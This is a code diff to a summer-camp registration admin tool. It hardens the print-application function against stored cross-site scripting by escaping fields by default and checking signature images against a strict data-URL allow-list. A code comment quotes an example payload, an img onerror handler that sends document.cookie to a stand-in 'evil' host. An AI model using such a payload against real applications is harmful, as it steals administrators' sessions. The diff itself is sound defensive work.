@@ -1527,32 +1527,49 @@ function saveAppNote(id){
 function printApplication(id){
     var e=enrollments[id];if(!e)return;
     var w=window.open('','_blank','width=800,height=900');
-    var h='<html><head><title>Application — '+e.camperName+'</title><style>body{font-family:Arial,sans-serif;padding:30px;font-size:13px;color:#1E293B}h1{font-size:18px;margin:0 0 4px}h2{font-size:13px;color:#D97706;text-transform:uppercase;margin:16px 0 6px;border-bottom:1px solid #E2E8F0;padding-bottom:3px}table{width:100%;border-collapse:collapse}td{padding:3px 0;vertical-align:top}td:first-child{width:120px;color:#64748B;font-weight:600}.med{color:#EF4444;font-weight:600}.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700}img{max-width:250px;height:70px;object-fit:contain;border:1px solid #E2E8F0;border-radius:4px}@media print{body{padding:15px}}</style></head><body>';
-    h+='<h1>'+esc(e.camperName)+'</h1>';
-    h+='<div style="color:#64748B;font-size:12px;margin-bottom:12px">Application ID: '+esc(id)+' · Status: '+e.status+' · Applied: '+e.appliedDate+'</div>';
 
-    function sec(t){return'<h2>'+t+'</h2><table>'}
-    function row(l,v){return v?'<tr><td>'+l+'</td><td>'+v+'</td></tr>':''}
+    // Stored-XSS hardening: every enrollment field originates from the
+    // unauthenticated public registration form. Earlier this helper
+    // interpolated raw values directly into HTML — an attacker submitting
+    // `e.medicalNotes = "<img src=x onerror=fetch('//evil/?'+document.cookie)>"`
+    // would execute in the admin's print window, with full session.
+    // Now: row() escapes by default; rowRaw() exists for pre-built HTML;
+    // signature is validated against a strict data-URL allow-list.
+
+    function sec(t){return'<h2>'+esc(t)+'</h2><table>'}
+    function row(l,v){return v?'<tr><td>'+esc(l)+'</td><td>'+esc(v)+'</td></tr>':''}
+    function rowRaw(l,html){return html?'<tr><td>'+esc(l)+'</td><td>'+html+'</td></tr>':''}
     function end(){return'</table>'}
 
+    function isSafeImageDataUrl(s){
+        // Data URLs only; PNG / JPEG / GIF / WebP / SVG-data variants we can't
+        // distinguish are excluded. SVG can carry script — never accept it.
+        return typeof s === 'string' &&
+               /^data:image\/(png|jpeg|jpg|gif|webp);base64,[A-Za-z0-9+\/=]+$/.test(s);
+    }
+
+    var h='<html><head><title>'+esc('Application — '+e.camperName)+'</title><style>body{font-family:Arial,sans-serif;padding:30px;font-size:13px;color:#1E293B}h1{font-size:18px;margin:0 0 4px}h2{font-size:13px;color:#D97706;text-transform:uppercase;margin:16px 0 6px;border-bottom:1px solid #E2E8F0;padding-bottom:3px}table{width:100%;border-collapse:collapse}td{padding:3px 0;vertical-align:top}td:first-child{width:120px;color:#64748B;font-weight:600}.med{color:#EF4444;font-weight:600}.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700}img{max-width:250px;height:70px;object-fit:contain;border:1px solid #E2E8F0;border-radius:4px}@media print{body{padding:15px}}</style></head><body>';
+    h+='<h1>'+esc(e.camperName)+'</h1>';
+    h+='<div style="color:#64748B;font-size:12px;margin-bottom:12px">Application ID: '+esc(id)+' · Status: '+esc(e.status)+' · Applied: '+esc(e.appliedDate)+'</div>';
+
     h+=sec('Camper');
-    h+=row('Name',esc(e.camperName));h+=row('DOB',e.dob);h+=row('Gender',e.gender);
+    h+=row('Name',e.camperName);h+=row('DOB',e.dob);h+=row('Gender',e.gender);
     h+=row('School',e.school);h+=row('Grade',e.schoolGrade);h+=row('Teacher',e.teacher);h+=end();
 
     h+=sec('Parent/Guardian');
-    h+=row('Name',esc(e.parentName)+(e.parentRelation?' ('+e.parentRelation+')':''));
+    h+=row('Name',e.parentName+(e.parentRelation?' ('+e.parentRelation+')':''));
     h+=row('Phone',e.parentPhone);h+=row('Email',e.parentEmail);
-    if(e.parent2Name)h+=row('Parent 2',esc(e.parent2Name)+(e.parent2Phone?' — '+e.parent2Phone:''));h+=end();
+    if(e.parent2Name)h+=row('Parent 2',e.parent2Name+(e.parent2Phone?' — '+e.parent2Phone:''));h+=end();
 
     h+=sec('Address');
     h+=row('Street',e.street);h+=row('City',e.city);h+=row('State',e.state);h+=row('ZIP',e.zip);h+=end();
 
     h+=sec('Emergency Contact');
-    h+=row('Name',esc(e.emergencyName)+(e.emergencyRel?' ('+e.emergencyRel+')':''));h+=row('Phone',e.emergencyPhone);h+=end();
+    h+=row('Name',e.emergencyName+(e.emergencyRel?' ('+e.emergencyRel+')':''));h+=row('Phone',e.emergencyPhone);h+=end();
 
     h+=sec('Medical');
-    h+=row('Allergies',e.allergies?'<span class="med">'+esc(e.allergies)+'</span>':'None');
-    h+=row('Medications',e.medications?'<span class="med">'+esc(e.medications)+'</span>':'None');
+    h+=rowRaw('Allergies',e.allergies?'<span class="med">'+esc(e.allergies)+'</span>':esc('None'));
+    h+=rowRaw('Medications',e.medications?'<span class="med">'+esc(e.medications)+'</span>':esc('None'));
     h+=row('Dietary',e.dietary||'None');h+=row('Notes',e.medicalNotes);h+=end();
 
     h+=sec('Preferences');
@@ -1568,7 +1585,7 @@ function printApplication(id){
         var labels=e.customQuestionLabels||[];
         Object.entries(e.customAnswers).forEach(function([key,val]){
             var idx=parseInt(key.replace('q',''));var label=labels[idx]||('Question '+(idx+1));
-            h+=row(label,Array.isArray(val)?val.join(', '):esc(val));
+            h+=row(label,Array.isArray(val)?val.join(', '):val);
         });h+=end();
     }
 
@@ -1577,11 +1594,18 @@ function printApplication(id){
         e.documents.forEach(function(d){h+='<div style="padding:2px 0">📄 '+esc(d.name)+'</div>'});
     }
 
-    if(e.signature){h+=sec('Signature');h+='<img src="'+e.signature+'">';}
+    if(e.signature){
+        h+=sec('Signature');
+        if(isSafeImageDataUrl(e.signature)){
+            h+='<img src="'+e.signature+'">';
+        }else{
+            h+='<div style="color:#94A3B8;font-size:11px">[Signature omitted — invalid image format]</div>';
+        }
+    }
 
     if(e.adminNotes){h+=sec('Admin Notes');h+='<p>'+esc(e.adminNotes)+'</p>';}
 
-    h+='<div style="margin-top:30px;font-size:11px;color:#94A3B8;border-top:1px solid #E2E8F0;padding-top:10px">Printed from Campistry Me · '+new Date().toLocaleString()+'</div>';
+    h+='<div style="margin-top:30px;font-size:11px;color:#94A3B8;border-top:1px solid #E2E8F0;padding-top:10px">Printed from Campistry Me · '+esc(new Date().toLocaleString())+'</div>';
     h+='</body></html>';
     w.document.write(h);w.document.close();
     setTimeout(function(){w.print()},300);
